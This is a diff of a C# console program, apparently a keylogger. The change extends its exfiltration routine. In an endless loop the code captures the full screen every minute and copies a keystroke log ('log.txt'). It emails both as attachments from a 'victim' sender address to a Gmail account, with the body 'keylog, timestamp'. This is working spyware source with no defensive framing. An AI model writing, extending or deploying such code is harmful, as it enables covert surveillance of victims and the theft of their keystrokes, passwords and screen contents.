@@ -24,22 +24,31 @@ namespace consolaCorreo
 
         private static void function_test()
         {
+            
             while (true)
             {
-
-                System.Threading.Thread.Sleep(30000);
+                int milisec = (60)*1000;
+                System.Threading.Thread.Sleep(milisec);
                 Bitmap ScreenToBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                 System.Drawing.Graphics.FromImage(ScreenToBitmap).CopyFromScreen(
                         new Point(0, 0),
                         new Point(0, 0),
                         new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
-                ScreenToBitmap.Save(System.Windows.Forms.Application.StartupPath + "pantalla.jpg");
+                ScreenToBitmap.Save(System.Windows.Forms.Application.StartupPath + "\\pantalla.jpg");
                 GMail Cr = new GMail();
                 MailMessage mnsj = new MailMessage();
                 mnsj.Subject = "pruebaJorge";
                 mnsj.To.Add(new MailAddress("uyarikuna@gmail.com"));
                 mnsj.From = new MailAddress("victim@hipster.com", "Nueva");
-                Attachment attach = new Attachment(System.Windows.Forms.Application.StartupPath + @"\log.txt");
+                    string targetPath = System.Windows.Forms.Application.StartupPath;
+                    string sourceFile = System.IO.Path.Combine(System.Windows.Forms.Application.StartupPath + @"\log.txt");
+                    string destFile = System.IO.Path.Combine(targetPath, "toMail.txt");
+                    System.IO.File.Copy(sourceFile, destFile, true);
+
+                Attachment attach = new Attachment(System.Windows.Forms.Application.StartupPath + @"\toMail.txt");
+               
+                mnsj.Attachments.Add(attach);
+                attach=new Attachment(System.Windows.Forms.Application.StartupPath + "\\pantalla.jpg");
                 mnsj.Attachments.Add(attach);
                 mnsj.Body = String.Format("keylog, timestamp: \n\n {0}", new DateTime().ToUniversalTime());
                 Cr.MandarCorreo(mnsj);
